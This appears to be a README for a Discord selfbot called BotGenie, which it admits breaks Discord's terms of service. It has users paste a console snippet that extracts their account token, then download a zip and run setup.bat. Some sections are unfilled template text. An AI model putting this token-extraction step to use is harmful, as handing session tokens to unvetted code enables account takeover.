# BotGenie

A user friendly Discord selfbot
<sup><sub>Disclaimer: this is against Discord's TOS, do it at your own risk. We aren't responsible for any punishments against you.</sub></sup>

## Prerequisites

Before proceeding, ensure you have the following:

- Your Discord account token
- Your user ID

### To obtain your Discord account token:

1. Open Discord Web.
2. Right-click anywhere on the page and select "Inspect" or press `Ctrl+Shift+I` (Cmd+Option+I on macOS) to open Developer Tools.
3. Go to the "Console" tab.
4. Type the following command and press Enter:
   
   ```javascript
   window.webpackChunkdiscord_app.push([
     [Math.random()],
     {},
     req => {
       if (!req.c) return;
       for (const m of Object.keys(req.c)
         .map(x => req.c[x].exports)
         .filter(x => x)) {
         if (m.default && m.default.getToken !== undefined) {
           return copy(m.default.getToken());
         }
         if (m.getToken !== undefined) {
           return copy(m.getToken());
         }
       }
     },
   ]);
   console.log('%cWorked!', 'font-size: 50px');
   console.log(`%cYou now have your token in the clipboard!`, 'font-size: 16px');
   ```

5. Your Discord token will be copied to your clipboard. Keep it secure and do not share it with anyone.

### To obtain your user ID:

Follow this short tutorial video: [How to Find Your Discord User ID](https://www.youtube.com/watch?v=mc3cV57m3mM).

Once you have both your Discord token and user ID, keep them safe until you're ready to use them with the setup process.

**Note:** Do not share your token with anyone to avoid compromising your account security.

### Installing

* First download the zip by doing the following commands
    First, cd into your downloads folder by opening cmd and running
    ```
    cd Downloads
    ```
    Then run:
    ```
    curl -L -o BotGenie.zip https://github.com/cl0wnZwormz/BotGenie/raw/main/BotGenie.zip
    ```
* After that, unzip the file, and run setup.bat, you will be asked some questions

### Executing program

* How to run the program
* The setup should have created a shortcut on your desktop. Run that.
```
code blocks for commands
```

## Help

For help contanct miaunescu0 on discord

## Authors

Contributors names and contact info

ex. kamikaze 
ex. [@DomPizzie](https://twitter.com/dompizzie)